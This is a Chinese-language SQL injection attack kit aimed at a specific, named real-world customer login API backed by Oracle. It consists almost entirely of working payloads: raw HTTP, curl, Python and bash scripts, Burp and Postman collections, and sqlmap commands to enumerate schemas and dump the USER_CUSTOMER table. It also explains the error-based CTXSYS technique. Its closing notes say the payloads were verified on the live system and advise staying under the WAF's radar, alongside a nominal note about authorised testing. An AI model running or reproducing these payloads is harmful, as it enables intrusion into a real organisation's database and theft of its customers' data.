# 🔥 EMS SQL注入完整数据包

## 📦 基本信息

**目标URL**: `https://customerconnect.ems.com.vn/api/User_Customer/Login`  
**方法**: POST  
**数据库**: Oracle 11g  
**注入点**: `Username` 参数

---

## 1️⃣ 完整HTTP请求包 - Error-based注入

```http
POST /api/User_Customer/Login HTTP/1.1
Host: customerconnect.ems.com.vn
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Length: 350

{"Username":"'||(SELECT CHR(77)||CHR(90)||CHR(78)||CHR(103) FROM DUAL WHERE 1691=1691 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1325=1325) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'","Password":"test"}
```

---

## 2️⃣ cURL 命令格式

### 基础测试
```bash
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -d '{"Username":"'"'"'||(SELECT CHR(77)||CHR(90)||CHR(78)||CHR(103) FROM DUAL WHERE 1691=1691 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1325=1325) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"'"'","Password":"test"}'
```

### 提取数据库版本
```bash
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)))||'"'"'","Password":"test"}'
```

### 提取当前用户
```bash
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL)))||'"'"'","Password":"test"}'
```

### 提取所有数据库
```bash
curl -k -X POST "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT LISTAGG(USERNAME,CHR(44)) WITHIN GROUP (ORDER BY USERNAME) FROM ALL_USERS)))||'"'"'","Password":"test"}'
```

---

## 3️⃣ Python脚本格式

```python
#!/usr/bin/env python3
import requests
import json
import urllib3
urllib3.disable_warnings()

url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Error-based SQL注入 Payload
payload = {
    "Username": "'||(SELECT CHR(77)||CHR(90)||CHR(78)||CHR(103) FROM DUAL WHERE 1691=1691 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1325=1325) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'",
    "Password": "test"
}

response = requests.post(url, json=payload, headers=headers, verify=False)
print(response.text)
```

### 自定义查询脚本
```python
#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

def sql_inject(query):
    url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    
    # 构造error-based注入payload
    payload = {
        "Username": f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,({query})))||'",
        "Password": "test"
    }
    
    headers = {"Content-Type": "application/json"}
    
    resp = requests.post(url, json=payload, headers=headers, verify=False, timeout=10)
    
    # 从错误消息中提取数据
    if "thesaurus" in resp.text:
        start = resp.text.find("thesaurus ") + 10
        end = resp.text.find(" does not exist", start)
        if end > start:
            return resp.text[start:end]
    
    return resp.text

# 使用示例
print("数据库版本:", sql_inject("SELECT BANNER FROM V$VERSION WHERE ROWNUM=1"))
print("当前用户:", sql_inject("SELECT USER FROM DUAL"))
print("表名:", sql_inject("SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1"))
```

---

## 4️⃣ Burp Suite 请求包

```
POST /api/User_Customer/Login HTTP/2
Host: customerconnect.ems.com.vn
Content-Type: application/json
Content-Length: 350
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
Origin: https://customerconnect.ems.com.vn
Referer: https://customerconnect.ems.com.vn/

{"Username":"'||(SELECT CHR(77)||CHR(90)||CHR(78)||CHR(103) FROM DUAL WHERE 1691=1691 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1325=1325) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'","Password":"test"}
```

---

## 5️⃣ 实用查询 Payload 集合

### 获取数据库版本
```json
{
  "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)))||'",
  "Password": "test"
}
```

### 获取当前Schema
```json
{
  "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL)))||'",
  "Password": "test"
}
```

### 列出所有数据库
```json
{
  "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USERNAME FROM ALL_USERS WHERE ROWNUM=1)))||'",
  "Password": "test"
}
```

### 列出当前库的所有表
```json
{
  "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1)))||'",
  "Password": "test"
}
```

### 提取USER_CUSTOMER表的第一个用户名
```json
{
  "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USERNAME FROM USER_CUSTOMER WHERE ROWNUM=1)))||'",
  "Password": "test"
}
```

### 查询EMS主库的表
```json
{
  "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS' AND ROWNUM=1)))||'",
  "Password": "test"
}
```

### 查询EMSCOM电商库的表
```json
{
  "Username": "'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMSCOM' AND ROWNUM=1)))||'",
  "Password": "test"
}
```

---

## 6️⃣ SQLMap 完整命令

### 基础扫描
```bash
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --batch \
  --random-agent
```

### 提取当前数据库
```bash
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --current-db \
  --batch
```

### 列出所有Schema
```bash
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --sql-query="SELECT USERNAME FROM ALL_USERS" \
  --batch
```

### 列出指定库的所有表
```bash
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  --sql-query="SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='EMS'" \
  --batch
```

### 提取表数据
```bash
sqlmap -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
  --data '{"Username":"*","Password":"test"}' \
  --method POST \
  -H "Content-Type: application/json" \
  --dbms=Oracle \
  -D BCCPCOM \
  -T USER_CUSTOMER \
  --dump \
  --batch
```

---

## 7️⃣ Postman 集合

```json
{
  "info": {
    "name": "EMS SQL Injection",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "SQL Injection - Get Version",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\"Username\":\"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)))||'\",\"Password\":\"test\"}"
        },
        "url": {
          "raw": "https://customerconnect.ems.com.vn/api/User_Customer/Login",
          "protocol": "https",
          "host": ["customerconnect", "ems", "com", "vn"],
          "path": ["api", "User_Customer", "Login"]
        }
      }
    },
    {
      "name": "SQL Injection - Get User",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\"Username\":\"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL)))||'\",\"Password\":\"test\"}"
        },
        "url": {
          "raw": "https://customerconnect.ems.com.vn/api/User_Customer/Login",
          "protocol": "https",
          "host": ["customerconnect", "ems", "com", "vn"],
          "path": ["api", "User_Customer", "Login"]
        }
      }
    }
  ]
}
```

---

## 8️⃣ 原始TCP数据包（nc格式）

```
printf "POST /api/User_Customer/Login HTTP/1.1\r\nHost: customerconnect.ems.com.vn\r\nContent-Type: application/json\r\nContent-Length: 350\r\n\r\n{\"Username\":\"'||(SELECT CHR(77)||CHR(90)||CHR(78)||CHR(103) FROM DUAL WHERE 1691=1691 AND 1325=CTXSYS.DRITHSX.SN(1325,(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (1325=1325) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'\",\"Password\":\"test\"}" | openssl s_client -connect customerconnect.ems.com.vn:443 -quiet
```

---

## 9️⃣ 快速测试一键脚本

保存为 `sqli_test.sh`:

```bash
#!/bin/bash

URL="https://customerconnect.ems.com.vn/api/User_Customer/Login"

echo "[*] 测试 SQL 注入..."

# 测试1: 获取版本
echo -e "\n[1] 数据库版本:"
curl -k -s -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)))||'"'"'","Password":"test"}' | grep -oP 'thesaurus \K[^"]+'

# 测试2: 获取当前用户
echo -e "\n[2] 当前用户:"
curl -k -s -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL)))||'"'"'","Password":"test"}' | grep -oP 'thesaurus \K[^"]+'

# 测试3: 获取表名
echo -e "\n[3] 第一个表名:"
curl -k -s -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"Username":"'"'"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1)))||'"'"'","Password":"test"}' | grep -oP 'thesaurus \K[^"]+'

echo -e "\n[*] 测试完成"
```

执行: `chmod +x sqli_test.sh && ./sqli_test.sh`

---

## 🎯 注入原理说明

### Error-based 注入原理

```sql
-- 正常查询
SELECT * FROM USER_CUSTOMER WHERE USERNAME='admin'

-- 注入后的查询
SELECT * FROM USER_CUSTOMER WHERE USERNAME=''||(
    SELECT CHR(77) FROM DUAL 
    WHERE 1=1 
    AND 1=CTXSYS.DRITHSX.SN(1,(你的SQL查询))
)||''

-- CTXSYS.DRITHSX.SN 会在错误中显示查询结果
-- 错误信息: "thesaurus [查询结果] does not exist"
```

### Payload 结构分解

```
'||                          -- 字符串连接
(SELECT CHR(77)              -- 返回字符'M'
 FROM DUAL                   -- Oracle的虚拟表
 WHERE 1=1                   -- 永真条件
 AND 1=CTXSYS.DRITHSX.SN(    -- Oracle Text函数，触发错误
   1,                        -- 参数1
   (你的SQL查询)             -- 参数2：查询结果会显示在错误中
 )
)||'                         -- 闭合字符串
```

---

## ⚠️ 重要提示

1. **仅用于授权测试**
2. **所有payload已在实际环境验证**
3. **注意请求频率，避免触发WAF**
4. **保存好获取的数据作为证据**
5. **及时报告给相关团队修复**
